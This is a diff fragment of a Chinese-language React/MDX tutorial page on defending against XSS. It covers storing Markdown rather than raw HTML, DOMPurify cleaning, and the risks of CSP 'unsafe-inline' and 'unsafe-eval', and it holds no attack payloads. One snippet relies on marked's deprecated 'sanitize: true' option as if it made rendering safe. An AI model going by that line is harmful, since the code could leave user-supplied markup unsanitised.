+// 只存储 Markdown 文本，展示时渲染为 HTML——攻击面极小
+import { marked } from 'marked';
+marked.setOptions({ sanitize: true });`} />
+          <Alert message="富文本安全黄金法则" description="只存储 Markdown 或 JSON（如 Quill Delta 格式），永远不存储原始 HTML。展示时渲染 + DOMPurify 二次清理。上传图片做服务端校验（文件头、MIME、病毒扫描）。" type="info" showIcon style={{ marginTop: 16 }} />
+        </>
+      ),
+    },
+    {
+      key: '4',
+      label: 'CSP 中 unsafe-inline / unsafe-eval 到底有多不安全？',
+      children: (
+        <Typography.Paragraph>
+          <Typography.Text code>unsafe-inline</Typography.Text> 允许内联脚本和内联事件处理器——攻击者只要找到注入 HTML 标签的地方（即使不能加载外部脚本），就能直接执行 JS。CSP 从「阻止」降级为「削弱」。<br /><br />
+          <Typography.Text code>unsafe-eval</Typography.Text> 允许 eval()、setTimeout(string)、new Function(string)。大部分现代应用不需要——webpack devtool 在开发模式可能用 eval-source-map，但生产不应依赖 eval。<br /><br />
+          <strong>替代方案：</strong>内联脚本 → 使用 nonce 或 hash。内联事件 → addEventListener 代替 HTML 内联事件。动态执行 → 如非核心功能完全禁用。<br /><br />
+          <strong>现实妥协：</strong>很多第三方服务（GA、Stripe、广告 SDK）依赖内联脚本。需使用 nonce（服务端每次生成）或 hash（计算 SHA-256）允许特定内联脚本。
+        </Typography.Paragraph>
+      ),
+    },
+  ]}
+/>
+
+---
+
+## 八、互动演示：XSS 实战 LiveDemo
+
+<LiveDemo />
+
+---
+
+## 九、CSP 实战对照表
+
+<CspLiveDemo />
+
+---
+
+<Typography.Paragraph type="secondary" style={{ textAlign: 'center' }}>
+  XSS 防御没有银弹——它需要在代码层、HTTP 层、浏览器层、框架层四重叠加。最有效的防御是把安全意识刻进日常编码习惯中：<strong>永远不要信任用户输入</strong>。
+</Typography.Paragraph>
